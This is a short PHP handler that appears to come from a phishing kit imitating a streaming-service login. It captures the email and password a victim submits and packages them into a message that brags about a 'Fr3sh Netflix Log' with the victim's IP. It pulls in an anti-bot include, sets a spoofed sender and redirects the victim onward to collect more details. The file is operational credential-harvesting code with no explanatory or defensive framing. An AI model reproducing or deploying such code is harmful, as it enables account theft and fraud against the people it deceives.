<?php
  error_reporting(0);
  ob_start();
  session_start();
include '../../email.php';
include '../../antibots.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
  $_SESSION['email']  = $_POST['mail'];
  $_SESSION['pass']   = $_POST['pass'];
$message = "_______________________________
π²+1 Disney π² : ".$_SESSION['email'].":".$_SESSION['pass']."
_______________________________";
$Subject=" γπ°γ +1 Fr3sh Netflix Log From ".$_SESSION['email']."|π― "._ip();
$head="From: πStonksπ <rez@sdf.com>";
$_SESSION['step_one']  = true;
header('location: ../info.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));

}
else
{
  header('location: ../../login.php');
}

?>